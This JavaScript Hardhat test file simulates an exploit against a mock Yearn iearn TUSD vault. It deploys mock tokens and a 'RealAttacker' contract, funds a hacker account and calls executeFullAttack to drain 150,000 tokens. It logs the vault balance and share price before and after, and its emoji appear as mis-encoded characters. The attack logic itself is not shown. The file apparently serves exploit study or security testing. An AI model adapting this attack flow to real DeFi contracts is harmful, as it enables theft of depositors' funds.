const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Yearn iearn TUSD Exploit", function () {
  let vault, tusd, susd, strategy, attacker, owner, hacker;
  
  beforeEach(async function () {
    [owner, hacker] = await ethers.getSigners();
    
    // Deploy ALL contracts
    const MockTUSD = await ethers.getContractFactory("MockTUSD");
    tusd = await MockTUSD.deploy();
    
    const MockSUSD = await ethers.getContractFactory("MockSUSD");
    susd = await MockSUSD.deploy();
    
    const MockStrategy = await ethers.getContractFactory("MockStrategy");
    strategy = await MockStrategy.deploy();
    
    const VaultFactory = await ethers.getContractFactory("IeearnTUSDVault");
    vault = await VaultFactory.deploy(tusd.target, strategy.target);
    
    const AttackerFactory = await ethers.getContractFactory("RealAttacker");
    attacker = await AttackerFactory.deploy(vault.target, tusd.target, susd.target);
    
    // FUND VAULT $300K TVL
    await tusd.mint(vault.target, ethers.parseEther("300000"));
    
    // FUND HACKER
    await tusd.mint(hacker.address, ethers.parseEther("200000"));
    await susd.mint(attacker.target, ethers.parseEther("1000"));  // sUSD dust
  });
  
  it("ðŸ”¥ FULL EXPLOIT SIMULATION", async function () {
    // APPROVE TUSD to attacker
    await tusd.connect(hacker).approve(attacker.target, ethers.parseEther("200000"));
    
    console.log("NORMAL STATE:");
    console.log("- Vault TUSD:", ethers.formatEther(await tusd.balanceOf(vault.target)));
    console.log("- Share price:", ethers.formatEther(await vault.sharePrice()));
    
    // ðŸ”¥ EXECUTE ATTACK
    const DRAIN_AMOUNT = ethers.parseEther("150000");
    await attacker.connect(hacker).executeFullAttack(DRAIN_AMOUNT);
    
    console.log("\nðŸ’€ VAULT DESTROYED:");
    console.log("- Vault TUSD left:", ethers.formatEther(await tusd.balanceOf(vault.target)));
    console.log("- Hacker yTUSD:", ethers.formatEther(await vault.balanceOf(hacker.address)));
    console.log("- Share price:", ethers.formatEther(await vault.sharePrice()));
  });
});
